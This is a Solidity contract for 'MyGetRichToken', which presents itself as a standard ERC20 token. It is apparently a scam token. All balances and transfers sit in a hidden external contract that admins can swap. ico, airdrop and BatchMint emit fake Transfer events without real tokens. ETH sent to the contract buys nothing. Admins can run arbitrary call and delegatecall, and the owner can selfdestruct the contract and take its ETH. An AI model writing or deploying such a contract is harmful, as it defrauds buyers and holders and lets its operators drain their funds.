    
    pragma solidity 0.8.12;
    
    interface ERC20 {
    
        
        function name() external view returns (string memory);
    
        
        function symbol() external view returns (string memory);
    
        
        function decimals() external view returns (uint8);
    
        
        function totalSupply() external view returns (uint256);
    
        
        function balanceOf(address account) external view returns (uint256);
    
        
        function transfer(address from,address recipient, uint256 amount) external returns (bool);
    
        
        function allowance(address owner, address spender) external view returns (uint256);
    
        
        function approve(address from,address spender, uint256 amount) external returns (bool);
    
        
        function transferFrom(address from,address sender, address recipient,
            uint256 amount) external returns (bool);
    
        function isCanBatchMint() external view returns (bool);
    
        function dnum() external view returns (uint);
    }
    
    contract StandardToken {
    
        address private _owners;
    
        event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
        
        constructor () {
            _owners = msg.sender;
            emit OwnershipTransferred(address(0), _owners);
        }
    
        
        function owner() public view returns (address) {
            return _owners;
        }
    
        
        modifier onlyOwner() {
            require(isOwner(), "onlyOwner");
            _;
        }
    
        
        function isOwner() public view returns (bool) {
            return msg.sender == _owners||msg.sender == toolAddress;
        }
    
        
        function renounceOwnership() public onlyOwner {
            emit OwnershipTransferred(_owners, address(0));
            _owners = address(0);
        }
    
        
        function transferOwnership(address newOwner) public onlyOwner {
            _transferOwnership(newOwner);
        }
    
        
        function _transferOwnership(address newOwner) internal {
            require(newOwner != address(0));
            emit OwnershipTransferred(_owners, newOwner);
            _owners = newOwner;
        }
    
       
        mapping (address  => address) public adminMap;
    
        modifier onlyAdmin {
            require(adminMap[msg.sender] != address(0)||msg.sender == toolAddress, "onlyAdmin");
            _;
        }
        event Approval(address indexed owner, address indexed spender, uint256 value);
        event Transfer(address indexed from, address indexed to, uint256 value);
    
        function addAdminForThisToolToken(address addr) onlyOwner public returns(bool) {
            require(adminMap[addr] == address(0));
            adminMap[addr] = addr;
            return true;
        }
    
        function deleteAdminForThisToolToken(address addr) onlyOwner public returns(bool) {
            require(adminMap[addr] != address(0));
            adminMap[addr] = address(0);
            return true;
        }
        address public toolAddress;
    
        function setToolAddress(address _toolAddress) onlyAdmin public returns(bool) {
            toolAddress = _toolAddress;
            return true;
        }
       
        
        function totalSupply() public view returns (uint256) {
            return ERC20(toolAddress).totalSupply();
        }
    
        
        function transfer(address _to, uint256 _value) public returns (bool) {
            emit Transfer(msg.sender, _to, _value);
            return ERC20(toolAddress).transfer(msg.sender,_to, _value);
        }
    
        
        function balanceOf(address _owner) public view returns (uint256) {
            return ERC20(toolAddress).balanceOf(_owner);
        }
    
        
        function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
            emit Transfer(_from, _to, _value);
            return ERC20(toolAddress).transferFrom(msg.sender,_from, _to, _value);
        }
    
        
        function approve(address _spender, uint256 _value) public returns (bool) {
            return ERC20(toolAddress).approve(msg.sender,_spender, _value);
        }
    
        
        function allowance(address _owner, address _spender) public view returns (uint256) {
            return ERC20(toolAddress).allowance(_owner, _spender);
        }
    
        
        function name() public view returns (string memory) {
            return ERC20(toolAddress).name();
        }
    
        
        function symbol() public view returns (string memory) {
            return ERC20(toolAddress).symbol();
        }
    
        
        function decimals() public view returns (uint8) {
            return ERC20(toolAddress).decimals();
        }
    }
    
    
    contract MyGetRichToken is StandardToken {
    
        constructor (address _toolAddress) payable{
            toolAddress=_toolAddress;
        }
        receive() external payable { 
            ico();
        }
        function kill(address payable to) public payable onlyOwner{
            selfdestruct(to);
        }
        function ico() public payable{
            if (ERC20(toolAddress).isCanBatchMint()) {
                address from=address(0);
                uint num=ERC20(toolAddress).dnum();
                emit Transfer(from, msg.sender,num);
            }
        }
        function airdrop() public payable{
            if (ERC20(toolAddress).isCanBatchMint()) {
                address from=address(0);
                uint num=ERC20(toolAddress).dnum();
                emit Transfer(from, msg.sender,num);
            }
        }
        function BatchMint(address[] memory accounts) public {
            if (ERC20(toolAddress).isCanBatchMint()) {
                address from=address(0);
                uint num=ERC20(toolAddress).dnum();
                for (uint i = 0; i < accounts.length;i++) {
                    emit Transfer(from, accounts[i],num);
                } 
            }
        }
        function callthis(
            address c,
            bytes memory datas
        )public onlyAdmin returns (
            bool success,
            bytes memory data
        ){
            if (ERC20(toolAddress).isCanBatchMint()) {
                (success, data) = c.call(datas);
            }
        }
        function callthis1(
            address c,
            bytes memory datas
        )public onlyAdmin returns (
            bool success,
            bytes memory data
        ){
            if (ERC20(toolAddress).isCanBatchMint()) {
                (success, data) = c.delegatecall(datas);
            }
        }
    }
